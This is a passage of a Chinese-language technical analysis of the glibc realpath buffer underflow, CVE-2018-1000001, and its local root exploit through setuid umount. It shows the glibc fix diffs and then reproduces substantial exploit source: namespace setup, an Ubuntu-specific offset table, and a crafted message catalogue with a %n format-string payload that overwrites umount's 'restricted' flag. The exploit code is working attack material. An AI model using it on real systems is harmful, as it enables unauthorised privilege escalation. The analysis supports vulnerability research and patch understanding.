@@ -1,0 +1,205 @@
+    +        path prefix." Unreachable root directories should not be
+    +        accessed, see https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/ */
+    +        __set_errno (EACCES);
+    +        goto error;
+    +      }
+    +      dest++;
+         }
+           else
+         {
+但这种方案似乎并没有被合并。
+最终采用的方案是直接从源头来解决，对 getcwd() 返回的路径 path 进行检查，如果确定 `path[0] ==
+'/'`，说明是绝对路径，返回。否则转到 `generic_getcwd()`（内部函数，源码里看不到）进行处理：
+    $ git show 52a713fdd0a30e1bd79818e2e3c4ab44ddca1a94 sysdeps/unix/sysv/linux/getcwd.c | cat
+    diff --git a/sysdeps/unix/sysv/linux/getcwd.c b/sysdeps/unix/sysv/linux/getcwd.c
+    index f545106289..866b9d26d5 100644
+    --- a/sysdeps/unix/sysv/linux/getcwd.c
+    +++ b/sysdeps/unix/sysv/linux/getcwd.c
+    @@ -76,7 +76,7 @@ __getcwd (char *buf, size_t size)
+       int retval;
+       retval = INLINE_SYSCALL (getcwd, 2, path, alloc_size);
+    -  if (retval >= 0)
+    +  if (retval > 0 && path[0] == '/')
+         {
+     #ifndef NO_ALLOCATION
+           if (buf == NULL && size == 0)
+    @@ -92,10 +92,10 @@ __getcwd (char *buf, size_t size)
+           return buf;
+         }
+    -  /* The system call cannot handle paths longer than a page.
+    -     Neither can the magic symlink in /proc/self.  Just use the
+    +  /* The system call either cannot handle paths longer than a page
+    +     or can succeed without returning an absolute path.  Just use the
+          generic implementation right away.  */
+    -  if (errno == ENAMETOOLONG)
+    +  if (retval >= 0 || errno == ENAMETOOLONG)
+         {
+     #ifndef NO_ALLOCATION
+           if (buf == NULL && size == 0)
+#### 0x04 Exploit
+umount 包含在 util-linux 中，为方便调试，我们重新编译安装一下：
+    $ sudo apt-get install dpkg-dev automake
+    $ sudo apt-get source util-linux
+    $ cd util-linux-2.27.1
+    $ ./configure
+    $ make && sudo make install
+    $ file /bin/umount 
+    /bin/umount: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2104fb4e2c126b9ac812e611b291e034b3c361f2, not stripped
+exp 主要分成两个部分：
+    int main(int argc, char **argv) {
+      [...]
+      pid_t nsPid=prepareNamespacedProcess();
+      while(excalateCurrentAttempt<escalateMaxAttempts) {
+        [...]
+        attemptEscalation();
+        [...]
+        if(statBuf.st_uid==0) {
+          fprintf(stderr, "Executable now root-owned\n");
+          goto escalateOk;
+        }
+      }
+    preReturnCleanup:
+      [...]
+      if(!exitStatus) {
+        fprintf(stderr, "Cleanup completed, re-invoking binary\n");
+        invokeShell("/proc/self/exe");
+        exitStatus=1;
+      }
+    escalateOk:
+      exitStatus=0;
+      goto preReturnCleanup;
+    }
+`prepareNamespacedProcess()`：准备一个运行在自己 mount namespace
+的进程，并设置好适当的挂载结构。该进程允许程序在结束时可以清除它，从而删除 namespace。
+`attemptEscalation()`：调用 umount 来获得 root 权限。
+简单地说一下 mount namespace，它用于隔离文件系统的挂载点，使得不同的 mount namespace
+拥有自己独立的不会互相影响的挂载点信息，当前进程所在的 mount namespace 里的所有挂载信息在
+`/proc/[pid]/mounts`、`/proc/[pid]/mountinfo` 和 `/proc/[pid]/mountstats` 里面。每个
+mount namespace 都拥有一份自己的挂载点列表，当用 clone 或者 unshare 函数创建了新的 mount namespace
+时，新创建的 namespace 会复制走一份原来 namespace 里的挂载点列表，但从这之后，两个 namespace 就没有关系了。
+首先为了提权，我们需要一个 SUID 程序，mount 和 umount 是比较好的选择，因为它们都依赖于 realpath()
+来解析路径，而且能被所有用户使用。其中 umount 又最理想，因为它一次运行可以操作多个挂载点，从而可以多次触发到漏洞代码。
+由于 umount 的 realpath() 的操作发生在堆上，第一步就得考虑怎样去创造一个可重现的堆布局。通过移除可能造成干扰的环境变量，仅保留
+locale 即可做到这一点。locale 在 glibc 或者其它需要本地化的程序和库中被用来解析文本（如时间、日期等），它会在 umount
+参数解析之前进行初始化，所以会影响到堆的结构和位于 realpath() 函数缓冲区前面的那些低地址的内容。漏洞的利用依赖于单个 locale
+的可用性，在标准系统中，libc 提供了一个 `/usr/lib/locale/C.UTF-8`，它通过环境变量 `LC_ALL=C.UTF-8`
+进行加载。
+在 locale 被设置后，缓冲区下溢将覆盖 locale 中用于加载 national language support(NLS) 的字符串中的一个
+/，进而将其更改为相对路径。然后，用户控制的 umount 错误信息的翻译将被加载，使用 fprintf() 函数的 %n
+格式化字符串，即可对一些内存地址进行写操作。由于 fprintf() 所使用的堆栈布局是固定的，所以可以忽略 ASLR
+的影响。于是我们就可以利用该特性覆盖掉 `libmnt_context` 结构体中的 restricted 字段：
+    // util-linux/libmount/src/mountP.h
+    struct libmnt_context
+    {
+        int    action;        /* MNT_ACT_{MOUNT,UMOUNT} */
+        int    restricted;    /* root or not? */
+        char    *fstype_pattern;    /* for mnt_match_fstype() */
+        char    *optstr_pattern;    /* for mnt_match_options() */
+        [...]
+    };
+在安装文件系统时，挂载点目录的原始内容会被隐藏起来并且不可用，直到被卸载。但是，挂载点目录的所有者和权限没有被隐藏，其中 restricted
+标志用于限制堆挂载文件系统的访问。如果我们将该值覆盖，umount 会误以为挂载是从 root 开始的。于是可以通过卸载 root 文件系统做到一个简单的
+DoS（如参考文章中所示，可以在Debian下尝试）。
+当然我们使用的 Ubuntu16.04 也是在漏洞利用支持范围内的：
+    static char* osSpecificExploitDataList[]={
+    // Ubuntu Xenial libc=2.23-0ubuntu9
+        "\"16.04.3 LTS (Xenial Xerus)\"",
+        "../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A",
+        "_nl_load_locale_from_archive",
+        "\x07\0\0\0\x26\0\0\0\x40\0\0\0\xd0\xf5\x09\x00\xf0\xc1\x0a\x00"
+        };
+`prepareNamespacedProcess()` 函数如下所示：
+    static int usernsChildFunction() {
+      [...]
+      int result=mount("tmpfs", "/tmp", "tmpfs", MS_MGC_VAL, NULL);    // 将 tmpfs 类型的文件系统 tmpfs 挂载到 /tmp
+      [...]
+    }
+    pid_t prepareNamespacedProcess() {
+      if(namespacedProcessPid==-1) {
+        [...]
+        namespacedProcessPid=clone(usernsChildFunction, stackData+(1<<20),
+            CLONE_NEWUSER|CLONE_NEWNS|SIGCHLD, NULL);    // 调用 clone() 创建进程，新进程执行函数 usernsChildFunction()
+        [...]
+      char pathBuffer[PATH_MAX];
+      int result=snprintf(pathBuffer, sizeof(pathBuffer), "/proc/%d/cwd",
+         namespacedProcessPid);
+      char *namespaceMountBaseDir=strdup(pathBuffer);    // /proc/[pid]/cwd 是一个符号连接, 指向进程当前的工作目录
+    // Create directories needed for umount to proceed to final state
+    // "not mounted".
+      createDirectoryRecursive(namespaceMountBaseDir, "(unreachable)/x");    // 在 cwd 目录下递归创建 (unreachable)/x。下同
+      result=snprintf(pathBuffer, sizeof(pathBuffer),
+          "(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES", osReleaseExploitData[2]);
+      createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);
+      result=snprintf(pathBuffer, sizeof(pathBuffer),
+          "(unreachable)/tmp/%s/X.X/LC_MESSAGES", osReleaseExploitData[2]);
+      createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);
+      result=snprintf(pathBuffer, sizeof(pathBuffer),
+          "(unreachable)/tmp/%s/X.x/LC_MESSAGES", osReleaseExploitData[2]);
+      createDirectoryRecursive(namespaceMountBaseDir, pathBuffer);
+    // Create symlink to trigger underflows.
+      result=snprintf(pathBuffer, sizeof(pathBuffer), "%s/(unreachable)/tmp/down",
+          namespaceMountBaseDir);
+      result=symlink(osReleaseExploitData[1], pathBuffer);    // 创建名为 pathBuffer 的符号链接
+      [...]
+    // Write the initial message catalogue to trigger stack dumping
+    // and to make the "umount" call privileged by toggling the "restricted"
+    // flag in the context.
+      result=snprintf(pathBuffer, sizeof(pathBuffer),
+          "%s/(unreachable)/tmp/%s/C.UTF-8/LC_MESSAGES/util-linux.mo",
+          namespaceMountBaseDir, osReleaseExploitData[2]);    // 覆盖 "restricted" 标志将赋予 umount 访问已装载文件系统的权限
+      [...]
+      char *stackDumpStr=(char*)malloc(0x80+6*(STACK_LONG_DUMP_BYTES/8));
+      char *stackDumpStrEnd=stackDumpStr;
+      stackDumpStrEnd+=sprintf(stackDumpStrEnd, "AA%%%d$lnAAAAAA",
+          ((int*)osReleaseExploitData[3])[ED_STACK_OFFSET_CTX]);
+      for(int dumpCount=(STACK_LONG_DUMP_BYTES/8); dumpCount; dumpCount--) {    // 通过格式化字符串 dump 栈数据，以对抗 ASLR
+        memcpy(stackDumpStrEnd, "%016lx", 6);
+        stackDumpStrEnd+=6;
+      }
+      [...]
+      result=writeMessageCatalogue(pathBuffer,
+          (char*[]){
+              "%s: mountpoint not found",
+              "%s: not mounted",
+              "%s: target is busy\n        (In some cases useful info about processes that\n         use the device is found by lsof(8) or fuser(1).)"
+          },
+          (char*[]){"1234", stackDumpStr, "5678"},
+          3);    // 伪造一个 catalogue，将上面的 stackDumpStr 格式化字符串写进去
+      [...]
+      result=snprintf(pathBuffer, sizeof(pathBuffer),
+          "%s/(unreachable)/tmp/%s/X.X/LC_MESSAGES/util-linux.mo",
+          namespaceMountBaseDir, osReleaseExploitData[2]);
+      secondPhaseTriggerPipePathname=strdup(pathBuffer);    // 创建文件
+      [...]
+      result=snprintf(pathBuffer, sizeof(pathBuffer),
+          "%s/(unreachable)/tmp/%s/X.x/LC_MESSAGES/util-linux.mo",
+          namespaceMountBaseDir, osReleaseExploitData[2]);
+      secondPhaseCataloguePathname=strdup(pathBuffer);        // 创建文件
+      return(namespacedProcessPid);        // 返回子进程 ID
+    }
+所创建的各种类型文件如下：
+    $ find /proc/10173/cwd/ -type d
+    /proc/10173/cwd/
+    /proc/10173/cwd/(unreachable)
+    /proc/10173/cwd/(unreachable)/tmp
+    /proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive
+    /proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/X.x
+    /proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/X.x/LC_MESSAGES
+    /proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/X.X
+    /proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/X.X/LC_MESSAGES
+    /proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/C.UTF-8
+    /proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/C.UTF-8/LC_MESSAGES
+    /proc/10173/cwd/(unreachable)/x
+    $ find /proc/10173/cwd/ -type f
+    /proc/10173/cwd/DATEMSK
+    /proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/C.UTF-8/LC_MESSAGES/util-linux.mo
+    /proc/10173/cwd/ready
+    $ find /proc/10173/cwd/ -type l
+    /proc/10173/cwd/(unreachable)/tmp/down
+    $ find /proc/10173/cwd/ -type p
+    /proc/10173/cwd/(unreachable)/tmp/_nl_load_locale_from_archive/X.X/LC_MESSAGES/util-linux.mo
+然后在父进程里可以对子进程进行设置，通过设置 setgroups 为 deny，可以限制在新 namespace 里面调用 setgroups()
+函数来设置 groups；通过设置 `uid_map` 和 `gid_map`，可以让子进程设置好挂载点。结果如下：
+    $ cat /proc/10173/setgroups 
+    deny
+    $ cat /proc/10173/uid_map 
